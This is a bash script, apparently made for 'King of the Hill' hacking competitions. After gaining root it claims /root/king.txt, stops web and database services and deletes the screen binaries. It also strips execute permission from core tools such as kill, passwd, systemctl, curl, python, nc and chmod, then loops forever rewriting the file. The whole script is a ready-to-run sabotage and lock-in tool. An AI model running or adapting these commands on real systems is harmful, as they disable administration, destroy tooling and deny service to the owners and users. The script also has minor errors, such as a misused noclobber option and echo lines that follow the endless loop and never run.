#!/bin/bash

echo "Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :) I'm kind :°) "

echo "Join our Discord Server: https://discord.gg/y3aCGbrT8J"

echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"

read -p "Enter your nickname: " nick
echo "Hello $nick :) Let's go"

echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"

sudo chmod 0755 /usr/bin/pkexec
sudo chmod -x /usr/bin/ftp
sudo chmod -x /usr/bin/nano
sudo chmod -x /usr/bin/vi
sudo chmod -x /usr/bin/ip
sudo chmod -x /usr/bin/ping
sudo chmod -x /usr/bin/pico
sudo chmod -x /usr/bin/find
sudo rm -rf /usr/bin/screen
sudo rm -rf /usr/bin/screen-4.5.0

echo "Patch part successfully ended..."

echo "-----------------------------------------------------------------------------"

sudo systemctl stop tomcat
sudo systemctl stop nginx
sudo systemctl stop mariadb

echo "Services Stopped..."

echo "-----------------------------------------------------------------------------"

sudo chattr -i /root/king.txt
echo "$nick" | sudo tee /root/king.txt >/dev/null
sudo chattr +i /root/king.txt
sudo chmod 400 /root/king.txt
set -o noclobber /root/king.txt

echo "-----------------------------------------------------------------------------"

echo "Files Operation Complete... Starting Operation 2..."

echo "-----------------------------------------------------------------------------"

sudo chmod -x /usr/bin/systemctl
sudo chmod -x /var
sudo chmod -x /usr/bin/passwd
sudo chmod -x /usr/bin/chattr
sudo chmod -x /usr/bin/kill
sudo chmod -x /usr/bin/killall
sudo chmod -x /usr/bin/pkill
sudo chmod -x /usr/bin/mv
sudo chmod -x /usr/bin/wget
sudo chmod -x /usr/bin/curl
sudo chmod -x /usr/bin/nano
sudo chmod -x /usr/bin/vim
sudo chmod -x /root/root
sudo chmod -x /root/koth
sudo chmod -x /dev/urandom
sudo chmod -x /usr/bin/vi
sudo chmod -x /usr/bin/python
sudo chmod -x /usr/bin/python2
sudo chmod -x /usr/bin/python3
sudo chmod -x /usr/bin/nc

echo "-----------------------------------------------------------------------------"

echo "Let's Go Forward... :)"

sudo chmod -x /bin/kill
sudo chmod -x /bin/systemctl
sudo chmod -x /usr/bin/chmod

while true; do
    current_nick=$(sudo cat /root/king.txt)
    if [ "$current_nick" != "$nick" ]; then
        echo "$nick" | sudo tee /root/king.txt >/dev/null
    fi
    sleep 0.5
done

echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"

echo "Operation Fully Complete. The KING is $nick ! :) "

echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
